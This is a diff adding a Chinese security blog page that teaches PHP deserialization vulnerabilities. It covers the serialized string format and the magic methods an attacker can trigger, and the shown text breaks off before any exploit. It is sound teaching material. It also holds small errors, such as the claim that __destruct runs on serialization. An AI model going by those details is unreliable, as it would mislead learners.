@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="本文已经首发在先知社区https://xz.aliyun.com/t/7023 反序列化漏洞[TOC] 漏洞简介1.1 什么是反序列化漏洞利用程序已有的一些函数在参数中注入一些代码，达到代码执行的效果。 1.2 漏洞危害攻击者可以利用反序列化漏洞,通过构造恶意请求报文远程执行命令，危害较大。 漏洞原理2.1 序列化与反序列化在了解反序列化漏洞之前，必须要先了解什么序列化、反序列化以及它们各有什么用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化详解&amp;实战">
+<meta property="og:url" content="http://ama666.cn/2020/01/12/反序列化详解-实战/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="本文已经首发在先知社区https://xz.aliyun.com/t/7023 反序列化漏洞[TOC] 漏洞简介1.1 什么是反序列化漏洞利用程序已有的一些函数在参数中注入一些代码，达到代码执行的效果。 1.2 漏洞危害攻击者可以利用反序列化漏洞,通过构造恶意请求报文远程执行命令，危害较大。 漏洞原理2.1 序列化与反序列化在了解反序列化漏洞之前，必须要先了解什么序列化、反序列化以及它们各有什么用">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191224205656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191224205434.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190754.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226100136.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226102425.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226102941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226104244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226112705.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226114103.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226142353.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226143305.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226145159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226151635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190905.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190933.png">
+<meta property="og:updated_time" content="2020-01-13T13:44:36.178Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反序列化详解&amp;实战">
+<meta name="twitter:description" content="本文已经首发在先知社区https://xz.aliyun.com/t/7023 反序列化漏洞[TOC] 漏洞简介1.1 什么是反序列化漏洞利用程序已有的一些函数在参数中注入一些代码，达到代码执行的效果。 1.2 漏洞危害攻击者可以利用反序列化漏洞,通过构造恶意请求报文远程执行命令，危害较大。 漏洞原理2.1 序列化与反序列化在了解反序列化漏洞之前，必须要先了解什么序列化、反序列化以及它们各有什么用">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191224205656.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2020/01/12/反序列化详解-实战/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>反序列化详解&实战 | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/01/12/反序列化详解-实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反序列化详解&实战
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-12 19:50:11" itemprop="dateCreated datePublished" datetime="2020-01-12T19:50:11+08:00">2020-01-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-01-13 21:44:36" itemprop="dateModified" datetime="2020-01-13T21:44:36+08:00">2020-01-13</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文已经首发在先知社区<a href="https://xz.aliyun.com/t/7023" target="_blank" rel="noopener">https://xz.aliyun.com/t/7023</a></p>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>[TOC]</p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="1-1-什么是反序列化漏洞"><a href="#1-1-什么是反序列化漏洞" class="headerlink" title="1.1 什么是反序列化漏洞"></a>1.1 什么是反序列化漏洞</h3><p>利用程序已有的一些函数在参数中注入一些代码，达到代码执行的效果。</p>
+<h3 id="1-2-漏洞危害"><a href="#1-2-漏洞危害" class="headerlink" title="1.2 漏洞危害"></a>1.2 漏洞危害</h3><p>攻击者可以利用反序列化漏洞,通过构造恶意请求报文远程执行命令，危害较大。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="2-1-序列化与反序列化"><a href="#2-1-序列化与反序列化" class="headerlink" title="2.1 序列化与反序列化"></a>2.1 序列化与反序列化</h3><p>在了解反序列化漏洞之前，必须要先了解什么序列化、反序列化以及它们各有什么用。</p>
+<h4 id="2-1-1-序列化"><a href="#2-1-1-序列化" class="headerlink" title="2.1.1 序列化"></a>2.1.1 序列化</h4><p>以<code>PHP</code>语言为例子，在写程序尤其是写网站的时候，经常会构造<code>类</code>，并且有时候会将实例化的类作为变量进行传输。序列化就是在此为了减少传输内容的大小孕育而生的一种压缩方法。我们知道一个<code>PHP类</code>都含有几个特定的元素: <code>类属性</code>、<code>类常量</code>、<code>类方法</code>。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的<code>类</code>表示出来并传递。<strong>序列化</strong>就是将一个类压缩成一个字符串的方法。</p>
+<p>运行以下PHP代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $passwd = <span class="string">'weak'</span>;</span><br><span class="line">	<span class="keyword">protected</span> $sex = <span class="string">'male'</span>;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">'ama666'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">modifyPasswd</span><span class="params">($passwd)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;passwd = $passwd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPasswd</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;$passwd;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ama666 = <span class="keyword">new</span> userInfo();</span><br><span class="line">$ama666-&gt;modifyPasswd(<span class="string">'strong'</span>);</span><br><span class="line">$data = serialize($ama666);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的输出结果为</p>
+<p>O:8:”userInfo”:3:{s:16:”userInfopasswd”;s:6:”strong”;s:6:”*sex”;s:4:”male”;s:4:”name”;s:6:”ama666”;}</p>
+<p>我们来逐一解读</p>
+<ul>
+<li><p>大括号外表示为“Object”对象名称长度为8是“userInfo”，这个对象有3个属性。</p>
+</li>
+<li><p>大括号内表示的则是这些属性的具体信息以及它们的值。</p>
+</li>
+</ul>
+<p>根据属性的权限不同，在序列化中的表示方法也有所不同。可以看出在代码中三个属性的权限分别是<code>private</code>，<code>protected</code>和<code>public</code>。这里简单说一下：</p>
+<blockquote>
+<ul>
+<li>public权限就是正常的变量权限，一般声明的变量权限均为public</li>
+<li>protected权限是私有权限，即只能在类内使用，子类可以继承这个变量</li>
+<li>private权限也是私有权限，比protected权限更似有一些，只能在本类内使用，子类不能继承</li>
+</ul>
+</blockquote>
+<p>可以看到代码中三个变量对应的三个权限在序列化字符串中都有不同的表达，红色是<code>private</code>，前面加上了本类名称；</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191224205656.png" alt></p>
+<p>蓝色是<code>protected</code>，前面加上了星号，绿色是<code>public</code>，没有任何前缀。</p>
+<p>总结来说一个类经过序列化之后存储在字符串的信息只有类名称和类内属性键值对，序列化字符串中没有将类方法一并序列化。这就引申出了本次讨论的主题，反序列化漏洞。</p>
+<h4 id="2-1-2-反序列化"><a href="#2-1-2-反序列化" class="headerlink" title="2.1.2 反序列化"></a>2.1.2 反序列化</h4><p>反序列化与序列化相对应的，就是将含有类信息的序列化过的字符串“解压缩”还原成类。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191224205434.png" alt></p>
+<p>如上图所示，将字符串反序列化出来之后的类不包含任何类方法，那么这样一个类怎么起作用呢？</p>
+<p>反序列化的类想要使用原先的类方法必须依托于<strong>域</strong>，脱离了域的反序列的类是无法调用序列化之前的类方法的。比如我在上一段代码结尾加上如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$new_ama666 = unserialize($data);</span><br><span class="line">$new_ama666-&gt;getPasswd();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190754.png" alt></p>
+<p>看到成功执行了类方法。如果我同样将之前序列化字符串作为输入，在一个新的域下执行以上代码片段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$data = <span class="string">"O:8:\"userInfo\":3:&#123;s:16:\"userInfopasswd\";s:6:\"strong\";s:6:\"*sex\";s:4:\"male\";s:4:\"name\";s:6:\"ama666\";&#125;"</span>;</span><br><span class="line">	$new_ama666 = unserialize($data);</span><br><span class="line">	$new_ama666-&gt;getPasswd();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191228190818.png" alt></p>
+<p>提示的是没有这个函数。总结来说反序列化漏洞可控的是要被反序列化的字符串，具体能够走多远还要依靠类方法。</p>
+<h3 id="2-2-PHP魔法函数"><a href="#2-2-PHP魔法函数" class="headerlink" title="2.2 PHP魔法函数"></a>2.2 PHP魔法函数</h3><p>到目前为止我们可以控制类属性，但还称不上漏洞，只能说是反序列化的特性，还要配合上特定函数才能发挥反序列化漏洞的威力。所以要先了解一些特殊的函数，这些函数都是我们在利用反序列化漏洞时候的好帮手，因为这些魔术方法均可以在一些特定的情况下自动触发。如果这些魔术方法中存在我们想要执行，或者说可以利用的函数，那我们就能够进一步进行攻击。</p>
+<h4 id="2-2-1-wakeup"><a href="#2-2-1-wakeup" class="headerlink" title="2.2.1 __wakeup()"></a>2.2.1 __wakeup()</h4><p>在php中如果需要进行<strong>反序列化</strong>，会先检查类中是否存在<code>__wakeup()</code>函数，如果存在，则会先调用此类方法，预先准备对象需要的资源。举例来说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;color = <span class="string">'white'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printColor</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;color . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line">$data = serialize($ama666);</span><br><span class="line">$new_ama666 = unserialize($data);</span><br><span class="line">$new_ama666-&gt;printColor();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行以上代码，结果如下，看到类属性<code>color</code>已经被<code>__wakeup()</code>函数自动调用并修改了。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226100136.png" alt></p>
+<p>这种函数被称为<strong>PHP魔法函数</strong>，会在一定条件下不需要调用而自动调用。</p>
+<h4 id="2-2-2-destruct"><a href="#2-2-2-destruct" class="headerlink" title="2.2.2 __destruct()"></a>2.2.2 __destruct()</h4><p>此魔法函数会在对象的所有引用都被删除或者类被销毁的时候自动调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct()"</span> . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"initializing..."</span> . PHP_EOL;</span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"serializing..."</span> . PHP_EOL;</span><br><span class="line">$data = serialize($ama666);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上代码，看到在序列化类的时候，<code>__destruct()</code>函数自动执行了。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226102425.png" alt></p>
+<h4 id="2-2-3-construct"><a href="#2-2-3-construct" class="headerlink" title="2.2.3 __construct()"></a>2.2.3 __construct()</h4><p>此函数会在创建一个类的实例时自动调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct()"</span> . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"initializing..."</span> . PHP_EOL;</span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"serializing..."</span> . PHP_EOL;</span><br><span class="line">$data = serialize($ama666);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上代码，看到类在序列化之前，实例化的时候<code>__construct()</code>函数就被调用了。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226102941.png" alt></p>
+<h4 id="2-2-4-toString"><a href="#2-2-4-toString" class="headerlink" title="2.2.4 __toString()"></a>2.2.4 __toString()</h4><p>此魔法函数会在类被当作字符串的时候调用。在PHP5.2以前，<code>__toString</code>函数只有在echo、print时才生效；PHP5.2以后则可以在任何字符串环境生效（例如通过 printf，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 <code>E_RECOVERABLE_ERROR</code> 级别的错误。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"__toString()"</span> . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"initializing..."</span> . PHP_EOL;</span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"echo..."</span> . PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $ama666;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"serializing..."</span> . PHP_EOL;</span><br><span class="line">$data = serialize($ama666);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上代码，当实例化对象被当作字符串使用的时候，<code>__toString()</code>函数自动调用。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226104244.png" alt></p>
+<p>还有一些不太容易想到的情况也能触发此函数</p>
+<blockquote>
+<ul>
+<li>反序列化对象与字符串连接时</li>
+<li>反序列化对象参与格式化字符串时</li>
+<li>反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</li>
+<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
+<li>反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</li>
+<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</li>
+<li>反序列化的对象作为 class_exists() 的参数的时候</li>
+</ul>
+</blockquote>
+<h4 id="2-2-5-get"><a href="#2-2-5-get" class="headerlink" title="2.2.5 __get()"></a>2.2.5 __get()</h4><p>在读取不可访问的属性值的时候，此魔法函数会自动调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $color = <span class="string">'black'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($color)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"__get()"</span> . PHP_EOL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$ama666 = <span class="keyword">new</span> example;</span><br><span class="line"><span class="keyword">echo</span> $ama666-&gt;color;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以上代码，因为试图访问私有变量<code>color</code>导致<code>__get()</code>函数自动调用。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20191226112705.png" alt></p>
+<h4 id="2-2-6-call"><a href="#2-2-6-call" class="headerlink" title="2.2.6 __call()"></a>2.2.6 __call()</h4><p><code>__call</code>是调用未定义的方法时调用的。</p>
